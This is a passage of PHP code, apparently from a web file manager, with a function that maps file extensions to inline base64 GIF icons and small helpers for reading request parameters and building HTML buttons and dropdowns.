            '|vbs|exe|msi|dll|bat|com|sh|bash|dash|ash|csh|zsh|ksh|tcsh|' => 'R0lGODlhFAAUALMAACMoKxwbJiAjJVqaHRcbG3niFSc1IsvMzTE5NSkuMlWPHWdqa3HMFjJHJj9eLi4zNiH5BAAAAAAALAAAAAAUABQAQASQcIFJq53uAMTKcEYgCMBjnk+SoiggBHA8TpznrCyqqqc7jrFAgpcoDXPIFEIFCBgUhUKDl9ulftgZktp7GTrRAsMwLCYfWQGBsBCckwAJwjHlJhPLh2PA6CsQZ1Z7fQwKBm5bSiAwWSWJJj5pjidHLT8ADZmaJpUsTU8DoQMKEwmISJFYBA8HCBcVa7EJCwcRADs=',
        ];
        if (is_dir($file)) {
            $k = 'dir';
        } else {
            $ext = '|' . strtolower(pathinfo($file, PATHINFO_EXTENSION)) . '|';
            foreach ($data as $key => $val) {
                if (strstr($key, $ext)) {
                    $k = $key;
                    break;
                }
            }
            if (empty($k)) $k = 'file';
        }
        return ' <img src="data:image/gif;base64,' . $data[$k] . '"> ';
    }
}

function g($key)
{
    return isset($_GET[$key]) ? $_GET[$key] : '';
}

function p($key)
{
    return isset($_POST[$key]) ? $_POST[$key] : '';
}

function btn($txt = '', $url = '')
{
    $str = " <button type=\"button\" onclick=\"history.back()\">后退</button> ";
    if ($txt) $str .= " <button type=\"button\" onclick=\"window.location=window.location.href\">刷新</button> <button type=\"button\" onclick=\"window.location='$url'\">$txt</button> ";
    return $str;
}

function select($name, $array, $value)
{
    $str = " <select name=\"$name\"><option value=\"\"></option>";
    foreach ($array as $val) {
        $selected = $value == $val ? ' selected' : '';
        $str .= "<option value=\"$val\" $selected>$val</option>";
    }
    return $str . "</select> ";
}
